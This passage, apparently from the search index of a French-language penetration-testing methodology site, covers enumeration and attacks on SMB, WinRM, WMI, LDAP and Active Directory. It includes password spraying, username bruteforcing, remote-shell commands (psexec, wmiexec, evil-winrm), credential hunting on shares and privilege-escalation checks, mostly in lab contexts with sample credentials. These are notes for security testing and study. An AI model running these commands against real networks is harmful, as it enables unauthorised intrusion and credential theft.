password.list ssh://$TARGET_IP\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/WMI/","title":"WMI","text":"<p>Port : 135/tcp</p> <pre><code>wmiexec.py Cry0l1t3:\"P455w0rD!\"@10.129.201.248 \"hostname\"\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/WinRM/","title":"WinRM","text":"<p>Ports :</p> <ul> <li>5985/tcp</li> <li>5986/tcp</li> </ul>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/WinRM/#enumeration","title":"Enumeration","text":"<pre><code>$ nmap -sV -sC 10.129.201.248 -p5985,5986 --disable-arp-ping -n\nPORT     STATE SERVICE VERSION\n5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Not Found\n|_http-server-header: Microsoft-HTTPAPI/2.0\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/WinRM/#tester-si-une-machine-a-winrm-dactif","title":"Tester si une machine a WinRM d'actif","text":""},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/WinRM/#sous-windows","title":"Sous windows","text":"<p>Utiliser le cmdlet <code>Test-WsMan</code></p>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/WinRM/#sous-linux","title":"Sous Linux","text":"<pre><code>evil-winrm -i $TARGET_IP -u $AD_USER -p $AD_PASSWORD\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Web/Distante/Recherche%20de%20sauvegardes/","title":"Recherche de sauvegardes","text":"<p>Si on trouve un dossier <code>.git/HEAD</code> on peut utiliser <code>git-dumper</code></p> <pre><code>pip install git-dumper\ngit-dumper http://website.com/.git ~/website\n</code></pre> <p>On peut ensuite acc\u00e9der au code source mais \u00e9galement chercher dans l'historique de GIT pour des informations int\u00e9ressantes</p> <p>https://socradar.io/tools-and-features-that-can-be-used-to-detect-sensitive-data-leaks-from-github-part-2/</p>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Web/Distante/gobuster/","title":"Gobuster","text":"<pre><code># Pour toutes les commandes gobuster, on peut voir ce qui se passe en ajoutant \n# le param\u00e8tre :     --proxy http://127.0.0.1:8080\n\n# Recherche de dossiers int\u00e9ressant :\ngobuster dir -u http://$TARGET:80/ -w \"/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\" -t 50 --add-slash      \n# extensions sp\u00e9cifiques\n\n\n# Recherche d'enregistrements DNS \ngobuster dns -d $TARGET_VHOST -r $TARGET_IP -t 50 -w /usr/share/SecLists/Discovery/DNS/namelist.txt\n\n# Recherche d'un sous domaine (VHOST)\ngobuster vhost --append-domain --url $TARGET_VHOST -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -t 50 \n</code></pre> <p>Voir toutes les choses \u00e0 \u00e9num\u00e9rer avec [[ffuf]]</p>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Distante/MS-SQL/","title":"MS SQL","text":"<p>[[MSSQL (SQL Server)]]</p>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Distante/Recherche%20de%20fichiers%20int%C3%A9ressants%20depuis%20Linux/","title":"Recherche de fichiers int\u00e9ressants depuis Linux","text":"<p>Si on a acc\u00e8s \u00e0 des partages SMB, on peut monter le partage et utiliser <code>find</code> pour chercher des fichiers int\u00e9ressants.</p>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Distante/Recherche%20de%20fichiers%20int%C3%A9ressants%20depuis%20Linux/#montage-du-partage-smb","title":"Montage du partage SMB","text":"<pre><code>mkdir -p /mnt/share\nsudo mount -t cifs -o username=$AD_USER,password=$AD_PASSWORD,domain=$AD_DOMAIN //$TARGET_IP/Sharename /mnt/share\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Distante/Recherche%20de%20fichiers%20int%C3%A9ressants%20depuis%20Linux/#fichiers-portant-un-nom-interessant","title":"Fichiers portant un nom int\u00e9ressant","text":""},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Distante/Recherche%20de%20fichiers%20int%C3%A9ressants%20depuis%20Linux/#fichiers-dont-le-contenu-est-interessant","title":"Fichiers dont le contenu est int\u00e9ressant","text":"<pre><code>grep -rn /mnt/share -ie cred\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Distante/Active%20Directory/Active%20Directory/","title":"Active Directory","text":""},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Distante/Active%20Directory/Active%20Directory/#recuperation-dinformations-active-directory-et-partages","title":"R\u00e9cup\u00e9ration d'informations Active Directory et partages","text":""},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Distante/Active%20Directory/Active%20Directory/#politique-de-mot-de-passe","title":"Politique de mot de passe","text":""},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Distante/Active%20Directory/Active%20Directory/#smb","title":"SMB","text":"<pre><code># crackmapexec\ncme smb $TARGET_IP -u \"sql_svc\" -p \"qsdqsd\" -d \"domain\"  --pass-pol | cut -c60-\n\n# enum4linux\nenum4linux -u \"\" -p \"\" -P $TARGET_IP\n\n# rpcclient\nrpcclient -U \"\" -N $TARGET_IP\n$&gt; querydominfo\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Distante/Active%20Directory/Active%20Directory/#ldap","title":"LDAP","text":"<pre><code># ldapsearch\nldapsearch -h $TARGET_IP -x -b \"DC=DOMAIN,DC=LOCAL\" -s sub \"*\" | grep -m 1 -B 10 pwdHistoryLength\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Distante/Active%20Directory/Active%20Directory/#comptes-utilisateurs","title":"Comptes utilisateurs","text":""},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Distante/Active%20Directory/Active%20Directory/#decouverte","title":"D\u00e9couverte","text":""},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Distante/Active%20Directory/Active%20Directory/#listing","title":"Listing","text":""},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Distante/Active%20Directory/Active%20Directory/#smb_1","title":"SMB","text":"<pre><code># crackmapexec\n## Acc\u00e8s guest restreint\ncme smb $TARGET -u \"guest\" -p \"\" --rid-brute 10000  # Max RID a adapter\n\n## Utilisateurs connus (AD / Station)\ncme smb $TARGET -u \"$AD_USER\" -p \"$AD_PASSWORD\" --users | tr -s ' ' | tail -n +4 | cut -d ' ' -f 5 | cut -d '\\' -f 2 | tee users.txt\n</code></pre> <pre><code>## Utilisateurs connect\u00e9s sur la station\ncme smb $TARGET_IP -u $AD_USER -p $AD_PASSWORD --loggedon-users \n</code></pre> <pre><code># enum4linux\nenum4linux -u \"$AD_USER\" -p \"$AD_PASSWORD\" -U $TARGET | grep user: | cut -d '[' -f2 | cut -d ']' -f1  | tee users.txt\n\n# enum4linux-ng\nenum4linux-ng -u \"\" -p \"\" -U $TARGET | grep 'username:' | tr -s ' ' | cut -d ' ' -f3 | tee users.txt\n\n# rpcclient\nrpcclient -U \"\" -N $TARGET -c 'enumdomusers;quit' | grep user: | cut -d '[' -f2 | cut -d ']' -f1  | tee users.txt\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Distante/Active%20Directory/Active%20Directory/#ldap_1","title":"LDAP","text":"<pre><code># crackmapexec\ncme ldap -u $AD_USER -p $AD_PASSWORD $TARGET_IP -dc-ip $TARGET_IP --users\n\n# ldapsearch\nldapsearch -h $TARGET_IP -x -b \"DC=DOMAIN,DC=LOCAL\" -s sub \"(&amp;(objectclass=user))\"  | grep sAMAccountName: | cut -d ' ' -f2\n\n# windapsearch\n# liste des administrateurs du domaine\nwindapsearch.py --dc-ip $TARGET -u $AD_USER@$AD_DOMAIN -p $AD_PASSWORD --da\n# liste d'utilisateurs potentiellement \u00e0 privil\u00e8ges\nwindapsearch.py --dc-ip $TARGET -u $AD_USER@$AD_DOMAIN -p $AD_PASSWORD --PU\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Distante/Active%20Directory/Active%20Directory/#bruteforce","title":"Bruteforce","text":"<p>Sans identifiants pr\u00e9alables, on pourra utiliser la liste des noms d'utilisateurs les plus communs provenant de https://github.com/insidetrust/statistically-likely-usernames et v\u00e9rifier quels comptes existent dans l'AD cible.</p> <p>Par exemple le fichier : https://raw.githubusercontent.com/insidetrust/statistically-likely-usernames/master/jsmith.txt</p> <pre><code>git clone  https://github.com/insidetrust/statistically-likely-usernames \ncd statistically-likely-usernames \n# kerbrute (VERSION SAFE qui s'arr\u00eate si un compte se retrouve verouill\u00e9 (pour \u00e9viter le drame))\nkerbrute userenum -d $DOMAIN --dc $TARGET --safe top-formats.txt -o \"/workspace/Misc Files/valid_user_output.txt\"\nkerbrute userenum -d $DOMAIN --dc $TARGET --safe jsmith.txt -o valid_user_output.txt\n\nkerbrute userenum -d $DOMAIN --dc $TARGET jsmith.txt -o valid_user_output.txt\n\n### WORD LIST interessantes :\n#  top-formats.txt : mix des diff\u00e9rents formats avec les noms les plus communs en premier\n\n# creation d'une liste d'utilisateurs valides :\ncat valid_user_output.txt | tr -d \" \\t\" | cut -d ':' -f4 | tee users_found_kerbrute.txt\n</code></pre> <p>Cet utilitaire tente tr\u00e8s rapidement tous les utilisateurs de la liste.</p> <p>Il ne g\u00e9n\u00e8re par d'\u00e9v\u00e8nement dans un AD configur\u00e9 avec les options par d\u00e9faut.</p>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Distante/Active%20Directory/Active%20Directory/#attaques","title":"Attaques","text":"<p>Lorsqu'on dispose d'une liste de comptes utilisateurs, on peut ensuite essayer de trouver leur mots de passe associ\u00e9s.</p>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Distante/Active%20Directory/Active%20Directory/#password-spraying","title":"Password Spraying","text":"<p>Attention :</p> <ul> <li>toujours v\u00e9rifier la politique de mot de passe en place (voir plus haut) avant de tenter un password spraying.</li> <li>ne pas tenter le nombre maximum de tentatives autoris\u00e9es !</li> <li><code>cme [...] --users</code>  affiche le nombre de mauvaise saisie des compteurs d'authentification (a ex\u00e9cuter sur le PDC emulator pour avoir l'information centralis\u00e9e de tous les DCs)</li> </ul> <p>Attaque \u00e0 partir d'une liste d'utilisateurs avec un mot de passe <code>$AD_PASSWORD</code></p> <pre><code># crackmapexec\ncme smb $TARGET_IP -u users.txt -p $AD_PASSWORD --local-auth --continue-on-success | grep '+'\n\n# rpcclient\nfor u in $(cat users.txt);do rpcclient -U \"$u%$AD_PASSWORD\" -c \"getusername;quit\" $TARGET_IP | grep Authority; done\n\n# kerbrute\nkerbrute passwordspray -d $AD_DOMAIN --dc $TARGET_IP users.txt  \"$AD_PASSWORD\"\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Distante/Active%20Directory/Active%20Directory/#groupes","title":"Groupes","text":"<pre><code># Liste de tous les groupes\ncme smb $TARGET_IP -u \"\" -p \"\" --groups\n# Liste des membres d'un groupe\ncme smb $TARGET_IP -u \"\" -p \"\" --groups \"Domain Admins\"\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Distante/Active%20Directory/Active%20Directory/#partages","title":"Partages","text":""},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Distante/Active%20Directory/Active%20Directory/#enumeration","title":"Enum\u00e9ration","text":"<pre><code>cme smb $TARGET_IP -u \"\" -p \"\" --shares\ncme smb $TARGET_IP -u \"$AD_USER\" -p \"$AD_PASSWORD\" -d \"$AD_DOMAIN\"  --shares | cut -c60-\n</code></pre> <pre><code># \ncme smb $TARGET_IP  -u 'guest' -p '' --shares | cut -c60-\n      [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)\n      [+] sequel.htb\\guest: \n      [+] Enumerated shares\n      Share           Permissions     Remark\n      -----           -----------     ------\n      ADMIN$                          Remote Admin\n      C$                              Default share\n      IPC$            READ            Remote IPC\n      NETLOGON                        Logon server share \n      Public          READ            \n      SYSVOL                          Logon server share \n# Authentification NULL\nenum4linux -a -u \"\" -p \"\" $TARGET_IP\n\nenum4linux-ng -A -R -C &lt;IP&gt;\n\n# Authentification avec le compte Guest (si non d\u00e9sactiv\u00e9)\nenum4linux -a -u \"guest\" -p \"\" $TARGET_IP\n\n# liste des partage avec type d'acc\u00e8s (lecture / \u00e9crite / rien)\nsmbmap -u $AD_USER -p $AD_PASSWORD -d $AD_DOMAIN -H $TARGET_IP\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Distante/Active%20Directory/Active%20Directory/#acces-a-un-partage","title":"Acc\u00e8s \u00e0 un partage","text":""},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Distante/Active%20Directory/Active%20Directory/#smbclientpy","title":"smbclient.py","text":"<pre><code>smbclient.py -no-pass $TARGET_IP  # null bind\nsmbclient.py \"$AD_DOMAIN/$AD_USER:$AD_PASSWORD@$TARGET_IP\"    \n\nsmbclient.py guest@sequel.htb\nPassword:       &lt;==== Appuyer sur Entrer\n# shares        &lt;==== liste les partages\n# use &lt;share name&gt;  &lt;=== se connecte \u00e0 ce partage\n# ls / cd  / cat [...]\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Distante/Active%20Directory/Active%20Directory/#smbclient","title":"smbclient","text":"<pre><code>smbclient -U guest%'' //$TARGET_IP/WorkShares \n\n# null authentication\nsmbclient -N -L //$TARGET_IP   # liste les partages\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Distante/Active%20Directory/Active%20Directory/#smbmap","title":"smbmap","text":"<pre><code># Liste des partages \nsmbmap -u \"\" -p \"\" -H $TARGET_IP   \n\n# Liste de fa\u00e7on r\u00e9cursive les fichiers d'un partage (indique si les droits sont en \u00e9criture ou en lecture)\nsmbmap -u $AD_USER -p $AD_PASSWORD -d $AD_DOMAIN -H $TARGET_IP -R \"$SHARE/\"\nsmbmap -u $AD_USER -p $AD_PASSWORD -d $AD_DOMAIN -H $TARGET_IP -R \"$SHARE/\" --dir-only\n\n# T\u00e9l\u00e9chargement d'un fichier \n$ smbmap -u \"\" -p \"\" -H $TARGET_IP --download  \"sambashare\\contents\\flag.txt\"\n\n# Upload d'un fichier \nsmbmap -u $AD_USER -p $AD_PASSWORD -d $AD_DOMAIN -H $TARGET_IP --upload desktop.ini Share/desktop.ini\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Distante/Active%20Directory/Active%20Directory/#explorer-les-partages","title":"Explorer les partages","text":""},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Distante/Active%20Directory/Active%20Directory/#crackmapexec","title":"crackmapexec","text":"<pre><code>rm -rf /tmp/cme_spider_plus # dossier contenant les r\u00e9sultats du module spider_plus\n\n# soit Lister tous les fichiers de tous les partages\ncme smb $TARGET -u $USER -p \"$PASSWORD\" -M spider_plus \n# soit Lister tous les fichiers de tous les partages\ncme smb $TARGET -u $USER -p \"$PASSWORD\" -M spider_plus --share 'Some Share'\n\n# Affichage des r\u00e9sultats \ncat /tmp/cme_spider_plus/*.json | jq '. | to_entries | .[] | {share: .key, file: .value | to_entries | .[].key} | \"\\(.share) | \\(.file)\"' | tee $TARGET_IP-share_files.txt\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Distante/Active%20Directory/Active%20Directory/#smbmap_1","title":"smbmap","text":"<pre><code>smbmap -u $AD_USER -p $AD_PASSWORD -d $AD_DOMAIN -H $TARGET_IP -R \"$SHARE/\" --dir-only\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Distante/Active%20Directory/Active%20Directory/#shell","title":"Shell","text":""},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Distante/Active%20Directory/Active%20Directory/#winrm","title":"WinRM","text":"<pre><code># V\u00e9rification d'acc\u00e8s WINRM\ncme winrm $TARGET_IP -u \"$AD_USER\" -p \"$AD_PASSWORD\" -d \"$AD_DOMAIN\"  | cut -c61-\n     [*] http://10.10.1.55:5985/wsman\n     [+] domain.local\\User:Mypass (Pwn3d!)\n# Obtention du shell via evil-winrm\nevil-winrm -i $TARGET_IP -u \"$AD_USER\" -p \"$AD_PASSWORD\"\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Distante/Active%20Directory/Active%20Directory/#rpc-smb","title":"RPC + SMB","text":"<p>Ex\u00e9cute un shell distant en tant que SYSTEM</p> <pre><code># N\u00e9cessite l'acc\u00e8s au partage Admin$ + RPC pour la communication\npsexec.py $AD_DOMAIN/$AD_USER:\"$AD_PASSWORD\"@$TARGET_IP\n# N\u00e9cessite l'acc\u00e8s \u00e0 un partage quelconque + RPC pour la communication\nsmbexec.py $AD_DOMAIN/$AD_USER:\"$AD_PASSWORD\"@$TARGET_IP\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Distante/Active%20Directory/Active%20Directory/#wmi","title":"WMI","text":"<p>Ex\u00e9cute un shell semi interactif (spawn un cmd.exe a chaque ex\u00e9cution de commande).</p> <p>Fourni un acc\u00e8s avec le compte utilisateur utilis\u00e9 ($AD_USER)</p> <pre><code>wmiexec.py $AD_DOMAIN/$AD_USER:\"$AD_PASSWORD\"@$TARGET_IP\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Distante/Active%20Directory/Active%20Directory/#decrpc","title":"DECRPC","text":"<p>SCShell</p> <p>https://github.com/Mr-Un1k0d3r/SCShell</p>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Distante/Active%20Directory/Active%20Directory/#bloodhound","title":"Bloodhound","text":"<p>Remarque : Il semble que bloodhound-python collecte moins d'informations que SharpHound ou d'autres ingestors. Il est donc recommand\u00e9 de pas se fier uniquement \u00e0 ses r\u00e9sultats et \u00e0 les comparer aux r\u00e9sultats fournis par SharpHound ou autre une fois qu'une machine Windows membre du domains est compromise.</p> <p>Bloodhound python injector available as a docker image (python2)</p> <p>sudo docker run --rm -v ${PWD}:/bloodhound-data -it bloodhound</p> <p>$ bloodhound-python  -u 'svc_apache' -p 'S@Ss!K@*t13' -c All -d 'flight.htb' -v -ns 10.10.11.187</p> <p>[[BloodHound]]</p> <p>```</p>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Locale/-%20Premi%C3%A8res%20V%C3%A9rifications%20Locales%20sous%20Windows/","title":"Premi\u00e8res V\u00e9rifications Locales sous Windows","text":"<pre><code># interfaces r\u00e9seaux, serveurs DNS, DHCP\nipconfig /all\n# table de routage\nroute print\n# table ARP\narp -a\n\n\n# Liste des privil\u00e8ges et informations AD\nwhoami /priv\nwhoami /groups\nnet user Compromised_Account\n\n# liste des utilisateurs\nnet user\n# Liste des groupes\nnet localgroup\n\n# politique de mot de passe\nnet accounts\n\n# utilisateurs connect\u00e9s\nqwinsta\n</code></pre> <ul> <li>[[Elements de protections]]</li> <li>[[Syst\u00e8me d'exploitation]]</li> <li>Version du net framework install\u00e9e (utile utiliser des outils compil\u00e9s pour la bonne version) :</li> </ul> <pre><code>Get-ChildItem 'HKLM:\\SOFTWARE\\Microsoft\\NET Framework Setup\\NDP' -Recurse\n</code></pre> <ul> <li> <p>[[Correctifs de S\u00e9curit\u00e9]]</p> </li> <li> <p>Quick wins :</p> <ul> <li>Selon les groupes et privil\u00e8ges dont on dispose, on pourra potentiellement exploiter certains d'entre eux :<ul> <li>[[Exploitation des privil\u00e8ges Windows]]</li> <li>[[Exploitation des groupes Windows]]</li> </ul> </li> <li>Vuln\u00e9rabilit\u00e9s ([[Quick Wins]])</li> </ul> </li> </ul> <p>==&gt; [[PrintNightmare (CVE-2021-1675)]]</p> <p>[[Firewall]]</p> <p>[[Processus]] / services</p> <pre><code># variables d'environnement\nset\n</code></pre> <p>[[Services]]</p> <p>[[Partages]]</p> <p>[[Services en \u00e9coute]]</p> <p>[[Infrastructure \u00e0 cl\u00e9s publiqu\u00e9s (PKI)]]</p> <p>[[Canaux nomm\u00e9s (Named Pipes)]]</p> <p>[[Logiciels install\u00e9s]]</p> <p>[[Recherche de fichiers int\u00e9ressants et credentials depuis Windows]]</p> <p>[[Taches plannifi\u00e9es]]</p> <p>regarder les descriptions des utilisateurs AD</p> <pre><code> Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Locale/-%20Premi%C3%A8res%20V%C3%A9rifications%20Locales%20sous%20Windows/#privesc","title":"Privesc","text":"<p>Winpeas </p> <p>PowerUp</p> <pre><code>Import-Module PowerUp.ps1\nInvoke-AllChecks\n</code></pre> <p>SharpUp.exe audit</p> <p>Seatbelt</p> <p>[[Interactions avec des utilisateurs]]</p> <p>R\u00e9f\u00e9rences :</p> <ul> <li>https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/windows-commands</li> </ul>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Locale/Acc%C3%A8s%20Fichier/","title":"Acc\u00e8s Fichier","text":"<pre><code>accesschk.exe  -accepteula -uws \"Tout le monde\" \"C:\\Program Files\"\naccesschk.exe  -accepteula -uws \"Everyone\" \"C:\\Program Files\"\naccesschk.exe  -accepteula -uws \"Users\" \"C:\\Program Files\"\naccesschk64.exe  -accepteula -nobanner -wus \"BUILTIN\\Users\" \"c:\\Department Shares\"\n# -u : supprimer les erreur\n# -w : droit en \u00e9criture\n# -s : r\u00e9cursif\n</code></pre> <pre><code>Get-ChildItem \"C:\\Program Files\" -Recurse | Get-ACL | ? {$_.AccessToString -match \"Everyone\\sAllow\\s\\sModify\"}\nGet-ChildItem \"C:\\Program Files\" -Recurse | Get-ACL | ? {$_.AccessToString -match \"Users\\sAllow\\s\\sModify\"}\n</code></pre> <pre><code># icacls\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Locale/Applocker/","title":"Applocker","text":"<pre><code># Lister la politique applocker\nGet-AppLockerPoliocy -Effective -XML &gt; applocker.xml\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Locale/Drivers/","title":"Drivers","text":"<p>Rechercher des exploits sur des drivers list\u00e9s ici (USBPcap par exemple)</p> <pre><code>driverquery /v\n</code></pre> <pre><code>driverquery.exe /v /fo csv | ConvertFrom-CSV | Select \"Display Name\", \"Start Mode\", \"Path\"\n</code></pre> <pre><code>Get-WmiObject Win32_PnPSignedDriver | Select DeviceName, DriverVersion, Manufacturer | ? {$_.DeviceName -like \"*vmwa*\"}\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Locale/Firewall/","title":"Firewall","text":"<pre><code># Etat du par feu\nnetsh advfirewall show currentprofile\n\n# Liste des r\u00e8gles \nnetsh advfirewall firewall show rule name=all\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Locale/Infrastructure%20%C3%A0%20cl%C3%A9s%20publiqu%C3%A9s%20%28PKI%29/","title":"Infrastructure \u00e0 cl\u00e9s publiqu\u00e9s (PKI)","text":"<p>Pour v\u00e9rifier si une autorit\u00e9 de certification est accessible depuis une machine membre d'un domaine Active Directory, on peut utiliser la commande :</p> <pre><code>certutil -config - -ping\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Locale/Logiciels%20install%C3%A9s/","title":"Logiciels install\u00e9s","text":""},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Locale/Logiciels%20install%C3%A9s/#applications-installees","title":"Applications install\u00e9es","text":"<pre><code>wmic product get name, version, vendor\n</code></pre> <pre><code>Get-WmiObject -Class Win32_Product |  select Name, Version\n\ngci \"c:\\Program Files\",\"c:\\Program Files (x86)\" -Force\n\n$INSTALLED = Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* |  Select-Object DisplayName, DisplayVersion, InstallLocation\n$INSTALLED += Get-ItemProperty HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName, DisplayVersion, InstallLocation\n$INSTALLED | ?{ $_.DisplayName -ne $null } | sort-object -Property DisplayName -Unique | Format-Table -AutoSize\n</code></pre> <p>On peut ensuite voir :</p> <ul> <li>si les versions sont r\u00e9centes ou non, (indice de maturit\u00e9 de l'entreprise en terme de s\u00e9curit\u00e9) et cherchercher si les version sont anciennes si des CVE existent.</li> <li>si elles peuvent contenir des identifiants / mots de passe que l'on pourrait collecter ([[Recherche de fichiers int\u00e9ressants et credentials depuis Windows]])</li> </ul>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Locale/Partages/","title":"Partages","text":""},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Locale/Partages/#liste-des-partages-locaux","title":"Liste des partages locaux","text":"<pre><code># Liste des partages actifs sur la machine\nPS &gt; get-smbshare                                                                                  \n\nName     ScopeName Path                                        Description        \n----     --------- ----                                        -----------        \nADMIN$   *         C:\\Windows                                  Remote Admin       \nC$       *         C:\\                                         Default share       \nIPC$     *                                                     Remote IPC         \nNETLOGON *         C:\\Windows\\SYSVOL\\sysvol\\flight.htb\\SCRIPTS Logon server share  \nShared   *         C:\\Shared                                                       \nSYSVOL   *         C:\\Windows\\SYSVOL\\sysvol                    Logon server share \nUsers    *         C:\\Users                                                        \n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Locale/Partages/#acces-a-un-partage-distant-depuis-windows","title":"Acc\u00e8s \u00e0 un partage distant depuis Windows","text":"<pre><code>$username = 'someuser'\n$password = 'somepass'\n$secpassword = ConvertTo-SecureString $password -AsPlainText -Force\n$cred = New-Object System.Management.Automation.PSCredential $username, $secpassword\nNew-PSDrive -Name \"S\" -Root \"\\\\192.168.10.10\\Common\" -PSProvider \"FileSystem\" -Credential $cred\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Locale/Partages/#liste-des-restrictions-fsrm-presentes-sue-un-partage","title":"Liste des restrictions FSRM pr\u00e9sentes sue un partage","text":"<pre><code># Liste des type de fichiers filtr\u00e9s sur les partages (FSRM File Screening)\nPS &gt; Get-FsrmFileScreen| select -expandproperty IncludeGroup\n\nAudio and Video Files                                      \nBackup Files                                               \nCompressed Files                                           \nE-mail Files     \nExecutable Files                                 \nImage Files                                     \nOffice Files                        \nShare                                                      \nSystem Files                                               \nTemporary Files  \nText Files                                      \nWeb Page Files                                  \n\n# Liste des extensions de fichiers associ\u00e9es aux \"IncludeGroups\" \nPS &gt; Get-FsrmFileGroup | ? { $_.Name -eq \"Share\" } | Select -ExpandProperty IncludePattern\n\n*.htm\n*.inf\n*.lnk\n*.pdf\n*.scf\n*.url\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Locale/Processus/","title":"Processus","text":"<p>On peut utiliser <code>Seatbelt.exe</code> pour chercher les processus non standards (semble a premi\u00e8re vue lister les path qui ne sont pas dans program files ou windows)</p> <pre><code>.\\Seatbelt.exe NonstandardProcesses\n</code></pre> <p>Liste des processus avec le nom du service associ\u00e9 lorsqu'il est disponible</p> <pre><code>tasklist /SVC\n</code></pre> <pre><code># liste des processus avec utilisateur et chemin d'acc\u00e8s\nGet-WmiObject Win32_Process |  \n   Select Name, @{Name=\"UserName\";Expression={$_.GetOwner().Domain+\"\\\"+$_.GetOwner().User}},@{Name=\"Path\";E={$_.Path}} |\n   Sort-Object UserName, Name\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Locale/Recherche%20de%20fichiers%20int%C3%A9ressants%20et%20credentials%20depuis%20Windows/","title":"Recherche de fichiers int\u00e9ressants et credentials depuis Windows","text":""},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Locale/Recherche%20de%20fichiers%20int%C3%A9ressants%20et%20credentials%20depuis%20Windows/#dossiers-interessants","title":"Dossiers int\u00e9ressants","text":"<pre><code>dir c:\\\ndir \"%USERPROFILE%\"\ndir \"%USERPROFILE%\\Documents\"\ndir \"%USERPROFILE%\\Desktop\"\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Locale/Recherche%20de%20fichiers%20int%C3%A9ressants%20et%20credentials%20depuis%20Windows/#mots-de-passe-enregistres","title":"Mots de passe enregistr\u00e9s","text":""},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Locale/Recherche%20de%20fichiers%20int%C3%A9ressants%20et%20credentials%20depuis%20Windows/#extraction-manuelle","title":"Extraction manuelle","text":""},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Locale/Recherche%20de%20fichiers%20int%C3%A9ressants%20et%20credentials%20depuis%20Windows/#cmdkey","title":"cmdkey","text":"<p>Si la commande <code>cmdkey /list</code> affiche des comptes, on pourra :</p> <ul> <li>Se connecter avec <code>mstsc.exe</code> avec un mot de passe pr\u00e9 enregistr\u00e9</li> <li>Executer une fen\u00eatre 